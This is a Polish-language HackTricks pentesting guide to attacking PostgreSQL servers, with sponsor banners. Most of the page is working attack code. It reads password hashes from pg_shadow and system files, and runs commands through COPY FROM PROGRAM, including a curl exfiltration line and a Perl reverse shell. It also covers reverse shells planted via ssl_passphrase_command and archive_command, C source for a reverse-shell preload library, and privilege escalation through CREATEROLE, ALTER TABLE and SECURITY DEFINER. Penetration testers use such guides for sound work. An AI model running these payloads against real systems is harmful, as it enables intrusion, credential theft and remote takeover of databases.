# 5432,5433 - Pentesting Postgresql

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społecznościowe na świecie.\
Uzyskaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}

{{#include ../banners/hacktricks-training.md}}

## **Podstawowe informacje**

**PostgreSQL** jest opisany jako **system baz danych obiektowo-relacyjnych**, który jest **open source**. System ten nie tylko wykorzystuje język SQL, ale także wzbogaca go o dodatkowe funkcje. Jego możliwości pozwalają na obsługę szerokiego zakresu typów danych i operacji, co czyni go wszechstronnym wyborem dla programistów i organizacji.

**Domyślny port:** 5432, a jeśli ten port jest już zajęty, wydaje się, że postgresql użyje następnego portu (prawdopodobnie 5433), który nie jest zajęty.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Połączenie i podstawowe enumeracje
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Jeśli podczas uruchamiania **`\list`** znajdziesz bazę danych o nazwie **`rdsadmin`**, wiesz, że jesteś w **bazie danych PostgreSQL AWS**.

Aby uzyskać więcej informacji na temat **jak wykorzystać bazę danych PostgreSQL**, sprawdź:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Automatyczna enumeracja
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Skanowanie portów**

Zgodnie z [**tym badaniem**](https://www.exploit-db.com/papers/13084), gdy próba połączenia kończy się niepowodzeniem, `dblink` zgłasza wyjątek `sqlclient_unable_to_establish_sqlconnection`, który zawiera wyjaśnienie błędu. Przykłady tych szczegółów są wymienione poniżej.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host jest niedostępny

`DETAIL: nie można połączyć się z serwerem: Brak trasy do hosta Czy serwer działa na hoście "1.2.3.4" i akceptuje połączenia TCP/IP na porcie 5678?`

- Port jest zamknięty
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port jest otwarty
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
lub
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port jest otwarty lub filtrowany
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
W funkcjach PL/pgSQL obecnie nie jest możliwe uzyskanie szczegółów wyjątków. Jednak jeśli masz bezpośredni dostęp do serwera PostgreSQL, możesz odzyskać potrzebne informacje. Jeśli wydobycie nazw użytkowników i haseł z tabel systemowych nie jest możliwe, możesz rozważyć wykorzystanie metody ataku słownikowego omówionej w poprzedniej sekcji, ponieważ może ona przynieść pozytywne wyniki.

## Wyliczanie Uprawnień

### Role

| Typy Ról      |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rola ma uprawnienia superużytkownika                                                                                                                |
| rolinherit     | Rola automatycznie dziedziczy uprawnienia ról, których jest członkiem                                                                                |
| rolcreaterole  | Rola może tworzyć więcej ról                                                                                                                       |
| rolcreatedb    | Rola może tworzyć bazy danych                                                                                                                       |
| rolcanlogin    | Rola może się zalogować. To znaczy, ta rola może być użyta jako identyfikator autoryzacji sesji początkowej                                         |
| rolreplication | Rola jest rolą replikacji. Rola replikacji może inicjować połączenia replikacyjne oraz tworzyć i usuwać sloty replikacji.                         |
| rolconnlimit   | Dla ról, które mogą się logować, ustawia maksymalną liczbę jednoczesnych połączeń, które ta rola może nawiązać. -1 oznacza brak limitu.            |
| rolpassword    | Nie hasło (zawsze odczytywane jako `********`)                                                                                                      |
| rolvaliduntil  | Czas wygaśnięcia hasła (używane tylko do autoryzacji hasłem); null, jeśli brak wygaśnięcia                                                        |
| rolbypassrls   | Rola omija każdą politykę bezpieczeństwa na poziomie wiersza, zobacz [Sekcja 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) po więcej informacji. |
| rolconfig      | Domyślne wartości specyficzne dla roli dla zmiennych konfiguracyjnych w czasie wykonywania                                                          |
| oid            | ID roli                                                                                                                                             |

#### Interesujące Grupy

- Jeśli jesteś członkiem **`pg_execute_server_program`**, możesz **wykonywać** programy
- Jeśli jesteś członkiem **`pg_read_server_files`**, możesz **czytać** pliki
- Jeśli jesteś członkiem **`pg_write_server_files`**, możesz **zapisywać** pliki

> [!NOTE]
> Zauważ, że w Postgres **użytkownik**, **grupa** i **rola** to **to samo**. To zależy od **sposobu użycia** i czy **zezwalasz na logowanie**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcje
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Akcje systemu plików

### Odczyt katalogów i plików

Z tego [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) członkowie zdefiniowanej grupy **`DEFAULT_ROLE_READ_SERVER_FILES`** (nazywanej **`pg_read_server_files`**) oraz **super użytkownicy** mogą używać metody **`COPY`** na dowolnej ścieżce (sprawdź `convert_and_check_filename` w `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Pamiętaj, że jeśli nie jesteś superużytkownikiem, ale masz uprawnienia **CREATEROLE**, możesz **stać się członkiem tej grupy:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Więcej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Istnieją **inne funkcje postgres**, które można wykorzystać do **odczytu pliku lub wylistowania katalogu**. Tylko **superużytkownicy** i **użytkownicy z wyraźnymi uprawnieniami** mogą z nich korzystać:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Możesz znaleźć **więcej funkcji** w [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Proste zapisywanie plików

Tylko **super użytkownicy** i członkowie **`pg_write_server_files`** mogą używać copy do zapisywania plików.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Pamiętaj, że jeśli nie jesteś superużytkownikiem, ale masz uprawnienia **`CREATEROLE`**, możesz **stać się członkiem tej grupy:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Więcej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Pamiętaj, że COPY nie obsługuje znaków nowej linii, dlatego nawet jeśli używasz ładunku base64, **musisz wysłać jedną linię**.\
Bardzo ważnym ograniczeniem tej techniki jest to, że **`copy` nie może być używane do zapisywania plików binarnych, ponieważ modyfikuje niektóre wartości binarne.**

### **Przesyłanie plików binarnych**

Jednak istnieją **inne techniki przesyłania dużych plików binarnych:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}

## <img src="../images/i3.png" alt="" data-size="original">

**Wskazówka dotycząca bug bounty**: **zarejestruj się** w **Intigriti**, premium **platformie bug bounty stworzonej przez hakerów, dla hackerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Aktualizacja danych tabeli PostgreSQL za pomocą zapisu lokalnego pliku

Jeśli masz niezbędne uprawnienia do odczytu i zapisu plików serwera PostgreSQL, możesz zaktualizować dowolną tabelę na serwerze, **nadpisując powiązany węzeł pliku** w [katalogu danych PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Więcej na ten temat** [**tutaj**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Wymagane kroki:

1.  Uzyskaj katalog danych PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Uwaga:** Jeśli nie możesz pobrać aktualnej ścieżki katalogu danych z ustawień, możesz zapytać o główną wersję PostgreSQL za pomocą zapytania `SELECT version()` i spróbować wymusić ścieżkę. Typowe ścieżki katalogów danych w instalacjach PostgreSQL na systemach Unix to `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Typowa nazwa klastra to `main`.

2.  Uzyskaj względną ścieżkę do węzła pliku, powiązanego z docelową tabelą

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

To zapytanie powinno zwrócić coś w stylu `base/3/1337`. Pełna ścieżka na dysku będzie wynosić `$DATA_DIRECTORY/base/3/1337`, tj. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Pobierz węzeł pliku za pomocą funkcji `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Uzyskaj typ danych, powiązany z docelową tabelą

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Użyj [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor), aby [edytować węzeł pliku](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); ustaw wszystkie flagi boolean `rol*` na 1 dla pełnych uprawnień.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Ponownie prześlij edytowany węzeł pliku za pomocą funkcji `lo_*` i nadpisz oryginalny plik na dysku

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcjonalnie)_ Wyczyść pamięć podręczną tabeli w pamięci, uruchamiając kosztowne zapytanie SQL

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Teraz powinieneś zobaczyć zaktualizowane wartości tabeli w PostgreSQL.

Możesz również stać się superadministratorem, edytując tabelę `pg_authid`. **Zobacz** [**następną sekcję**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE do programu**

Od [wersji 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html) tylko **superużytkownicy** i członkowie grupy **`pg_execute_server_program`** mogą używać copy do RCE (przykład z eksfiltracją:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Przykład do wykonania:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Pamiętaj, że jeśli nie jesteś superużytkownikiem, ale masz uprawnienia **`CREATEROLE`**, możesz **dodać się do tej grupy:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Więcej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Lub użyj modułu `multi/postgres/postgres_copy_from_program_cmd_exec` z **metasploit**.\
Więcej informacji na temat tej podatności [**tutaj**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Chociaż zgłoszono to jako CVE-2019-9193, Postgres zadeklarował, że to [funkcja i nie zostanie naprawione](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE z językami PostgreSQL

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE z rozszerzeniami PostgreSQL

Gdy **nauczyłeś się** z poprzedniego posta **jak przesyłać pliki binarne**, możesz spróbować uzyskać **RCE przesyłając rozszerzenie postgresql i ładując je**.

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE z pliku konfiguracyjnego PostgreSQL

> [!NOTE]
> Następujące wektory RCE są szczególnie przydatne w ograniczonych kontekstach SQLi, ponieważ wszystkie kroki można wykonać za pomocą zagnieżdżonych instrukcji SELECT

**Plik konfiguracyjny** PostgreSQL jest **zapisywalny** przez **użytkownika postgres**, który uruchamia bazę danych, więc jako **superużytkownik** możesz zapisywać pliki w systemie plików, a tym samym możesz **nadpisać ten plik.**

![](<../images/image (322).png>)

#### **RCE z ssl_passphrase_command**

Więcej informacji [na temat tej techniki tutaj](https://pulsesecurity.co.nz/articles/postgres-sqli).

Plik konfiguracyjny ma kilka interesujących atrybutów, które mogą prowadzić do RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ścieżka do klucza prywatnego bazy danych
- `ssl_passphrase_command = ''` Jeśli plik prywatny jest chroniony hasłem (szyfrowany), postgresql **wykona polecenie wskazane w tym atrybucie**.
- `ssl_passphrase_command_supports_reload = off` **Jeśli** ten atrybut jest **włączony**, **polecenie** wykonywane, jeśli klucz jest chroniony hasłem, **zostanie wykonane**, gdy `pg_reload_conf()` zostanie **wykonane**.

Wtedy atakujący będzie musiał:

1. **Zrzucić klucz prywatny** z serwera
2. **Szyfrować** pobrany klucz prywatny:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Nadpisać**
4. **Zrzucić** aktualną **konfigurację** postgresql
5. **Nadpisać** **konfigurację** z wymienionymi atrybutami:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Wykonać `pg_reload_conf()`

Podczas testowania zauważyłem, że to zadziała tylko wtedy, gdy **plik klucza prywatnego ma uprawnienia 640**, jest **własnością roota** i **grupy ssl-cert lub postgres** (tak, aby użytkownik postgres mógł go odczytać) i znajduje się w _/var/lib/postgresql/12/main_.

#### **RCE z archive_command**

**Więcej** [**informacji na temat tej konfiguracji i WAL tutaj**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Innym atrybutem w pliku konfiguracyjnym, który można wykorzystać, jest `archive_command`.

Aby to zadziałało, ustawienie `archive_mode` musi być `'on'` lub `'always'`. Jeśli to prawda, możemy nadpisać polecenie w `archive_command` i wymusić jego wykonanie za pomocą operacji WAL (logowanie przed zapisaniem).

Ogólne kroki to:

1. Sprawdź, czy tryb archiwizacji jest włączony: `SELECT current_setting('archive_mode')`
2. Nadpisz `archive_command` ładunkiem. Na przykład, odwrócone połączenie: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Przeładuj konfigurację: `SELECT pg_reload_conf()`
4. Wymuś wykonanie operacji WAL, co spowoduje wywołanie polecenia archiwizacji: `SELECT pg_switch_wal()` lub `SELECT pg_switch_xlog()` dla niektórych wersji Postgres

#### **RCE z bibliotekami preload**

Więcej informacji [na temat tej techniki tutaj](https://adeadfed.com/posts/postgresql-select-only-rce/).

Ten wektor ataku wykorzystuje następujące zmienne konfiguracyjne:

- `session_preload_libraries` -- biblioteki, które będą ładowane przez serwer PostgreSQL podczas połączenia klienta.
- `dynamic_library_path` -- lista katalogów, w których serwer PostgreSQL będzie szukał bibliotek.

Możemy ustawić wartość `dynamic_library_path` na katalog, który jest zapisywalny przez użytkownika `postgres` uruchamiającego bazę danych, np. katalog `/tmp/`, i przesłać tam złośliwy obiekt `.so`. Następnie wymusimy, aby serwer PostgreSQL załadował naszą nowo przesłaną bibliotekę, włączając ją w zmienną `session_preload_libraries`.

Kroki ataku to:

1. Pobierz oryginalny `postgresql.conf`
2. Włącz katalog `/tmp/` w wartość `dynamic_library_path`, np. `dynamic_library_path = '/tmp:$libdir'`
3. Włącz nazwę złośliwej biblioteki w wartość `session_preload_libraries`, np. `session_preload_libraries = 'payload.so'`
4. Sprawdź główną wersję PostgreSQL za pomocą zapytania `SELECT version()`
5. Skompiluj kod złośliwej biblioteki z odpowiednim pakietem deweloperskim PostgreSQL Przykładowy kod:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
kod pobrany z https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kompilacja kodu:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Prześlij złośliwy `postgresql.conf`, utworzony w krokach 2-3, i nadpisz oryginalny
7. Prześlij `payload.so` z kroku 5 do katalogu `/tmp`
8. Przeładuj konfigurację serwera, ponownie uruchamiając serwer lub wywołując zapytanie `SELECT pg_reload_conf()`
9. Przy następnym połączeniu z bazą danych otrzymasz połączenie z odwróconym powłoką.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Zgodnie z [**dokumentacją**](https://www.postgresql.org/docs/13/sql-grant.html): _Role mające uprawnienia **`CREATEROLE`** mogą **przyznawać lub odbierać członkostwo w dowolnej roli**, która **nie jest** **superużytkownikiem**._

Więc, jeśli masz uprawnienia **`CREATEROLE`**, możesz przyznać sobie dostęp do innych **ról** (które nie są superużytkownikami), co może dać ci możliwość odczytu i zapisu plików oraz wykonywania poleceń:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Zmiana hasła

Użytkownicy z tą rolą mogą również **zmieniać** **hasła** innych **nie-superużytkowników**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc do SUPERUSER

Dość powszechne jest stwierdzenie, że **lokalni użytkownicy mogą logować się do PostgreSQL bez podawania hasła**. Dlatego, gdy już zdobędziesz **uprawnienia do wykonywania kodu**, możesz nadużyć tych uprawnień, aby nadać sobie rolę **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> Zwykle jest to możliwe dzięki następującym liniom w pliku **`pg_hba.conf`**:
>
> ```bash
> # "local" jest tylko dla połączeń przez gniazdo domeny Unix
> local   all             all                                     trust
> # Połączenia lokalne IPv4:
> host    all             all             127.0.0.1/32            trust
> # Połączenia lokalne IPv6:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

W [**tym artykule**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) wyjaśniono, jak możliwe było **privesc** w Postgres GCP poprzez nadużycie uprawnienia ALTER TABLE, które zostało przyznane użytkownikowi.

Kiedy próbujesz **uczynić innego użytkownika właścicielem tabeli**, powinieneś otrzymać **błąd** uniemożliwiający to, ale najwyraźniej GCP dało tę **opcję użytkownikowi postgres, który nie jest superużytkownikiem** w GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Łącząc tę ideę z faktem, że kiedy polecenia **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) są wykonywane na **tabeli z funkcją indeksu**, **funkcja** jest **wywoływana** jako część polecenia z **uprawnieniami** **właściciela** **tabeli**. Możliwe jest stworzenie indeksu z funkcją i nadanie uprawnień właściciela **superużytkownikowi** nad tą tabelą, a następnie uruchomienie ANALYZE na tabeli z złośliwą funkcją, która będzie mogła wykonywać polecenia, ponieważ korzysta z uprawnień właściciela.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Wykorzystanie

1. Zacznij od utworzenia nowej tabeli.
2. Wstaw do tabeli kilka nieistotnych danych, aby dostarczyć dane dla funkcji indeksu.
3. Opracuj złośliwą funkcję indeksu, która zawiera ładunek do wykonania kodu, umożliwiając wykonywanie nieautoryzowanych poleceń.
4. Zmień właściciela tabeli na "cloudsqladmin", który jest rolą superużytkownika GCP używaną wyłącznie przez Cloud SQL do zarządzania i utrzymywania bazy danych.
5. Wykonaj operację ANALYZE na tabeli. Ta akcja zmusza silnik PostgreSQL do przełączenia się na kontekst użytkownika właściciela tabeli, "cloudsqladmin." W konsekwencji złośliwa funkcja indeksu jest wywoływana z uprawnieniami "cloudsqladmin", co umożliwia wykonanie wcześniej nieautoryzowanego polecenia powłoki.

W PostgreSQL ten proces wygląda mniej więcej tak:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Następnie tabela `shell_commands_results` będzie zawierać wyniki wykonania kodu:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalne logowanie

Niektóre źle skonfigurowane instancje postgresql mogą pozwalać na logowanie się dowolnego lokalnego użytkownika, możliwe jest logowanie z 127.0.0.1 za pomocą funkcji **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Zauważ, że aby poprzednie zapytanie działało, **funkcja `dblink` musi istnieć**. Jeśli nie istnieje, możesz spróbować ją utworzyć za pomocą
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Jeśli masz hasło użytkownika z większymi uprawnieniami, ale użytkownik nie ma pozwolenia na logowanie z zewnętrznego adresu IP, możesz użyć następującej funkcji, aby wykonywać zapytania jako ten użytkownik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Można sprawdzić, czy ta funkcja istnieje za pomocą:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Niestandardowa zdefiniowana funkcja z** SECURITY DEFINER

[**W tym opisie**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesterzy byli w stanie uzyskać podwyższone uprawnienia w instancji postgres dostarczonej przez IBM, ponieważ **znaleźli tę funkcję z flagą SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Jak [**wyjaśniono w dokumentacji**](https://www.postgresql.org/docs/current/sql-createfunction.html), funkcja z **SECURITY DEFINER jest wykonywana** z uprawnieniami **użytkownika, który ją posiada**. Dlatego, jeśli funkcja jest **vulnerable to SQL Injection** lub wykonuje jakieś **uprzywilejowane działania z parametrami kontrolowanymi przez atakującego**, może być nadużywana do **eskalacji uprawnień w postgres**.

W linii 4 poprzedniego kodu widać, że funkcja ma flagę **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
A następnie **wykonaj polecenia**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Atak Brute Force z PL/pgSQL

